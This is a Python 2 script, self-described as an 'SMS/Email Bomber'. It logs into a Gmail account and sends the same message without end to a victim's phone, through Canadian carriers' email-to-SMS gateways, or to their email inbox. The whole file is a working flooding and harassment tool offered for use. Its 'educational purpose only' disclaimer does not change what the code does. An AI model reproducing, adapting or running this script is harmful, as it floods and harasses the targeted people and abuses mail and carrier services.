# Python script originally written by cdxy @ Github
# Modded by syrius-dev for some additional options
# New phone carriers added to reflect QC and ON region
# This program is for Educational purpose ONLY. Do not use it without permission. 
# The usual disclaimer applies, especially the fact that me (syrius-dev) is not liable for any damages caused
# By direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears 
# NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that 
# any damage caused by the use of this script is not my responsibility.
# Contact: code2lulz@protonmail.com

import smtplib as s
import getpass

print"[+] syrius SMS/Email Bomber \n\r"
print"[+] Contact: code2lulz@protonmail.com \n\r"
print"[+] Please login with your Gmail account \n\r"
print"[+] Remember to allow less secure application from your GMail account in order for this script to work \n\r"


username = raw_input("Gmail Username (user@gmail.com): ")
password = getpass.getpass(prompt='Gmail Password: ')

obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(username, password)
print"\n\r"

print """ What kind of bomb would you like to send?

1. SMS
2. Email

"""
option = input()
print("\n\r")
if option == 1:
    carrier_attack = 0
    print """ What is their carrier? Respond with the corresponding number
        1. Bell
        2. Rogers
        3. Telus
        4. Koodo
        5. Wind
        6. Virgin Mobile
        7. Fido
        8. Videotron
        9. Don't know
"""
    carrier = input()

    if carrier == 1:
        carrier_attack = "@txt.bell.ca"
    if carrier == 2:
        carrier_attack = "@pcs.rogers.com"
    if carrier == 3:
        carrier_attack = "@msg.telus.com"
    if carrier == 4:
        carrier_attack = "@msg.koodomobile.com"
    if carrier == 5:
        carrier_attack = "@txt.windmobile.ca"
    if carrier == 6:
        carrier_attack = "@vmobile.ca"
    if carrier == 7:
        carrier_attack = "@sms.fido.ca"
    if carrier == 8:
        carrier_attack = "@pcs.rogers.com"
    if carrier == 9:
        print "Go on https://freecarrierlookup.com/ to discover the phone carrier"

    v_phone = raw_input("Phone Number: ") + str(carrier_attack)
    message = raw_input("Message: ")
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (username, "" .join(v_phone), "" .join(message)))

    while 1:
        obj.sendmail(username, v_phone, phone_message)
        print "Message sent! Sending another.. Press Ctrl + C to st0p."

if option == 2:
    v_email = raw_input("Email: ")
    message = raw_input("Message: ")
    email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
       % (username, "" .join(v_email), "" .join(message)))

    while 1:
        obj.sendmail(username, v_email, email_message)
        print "Message sent! Sending another.. Press Ctrl + C to st0p."
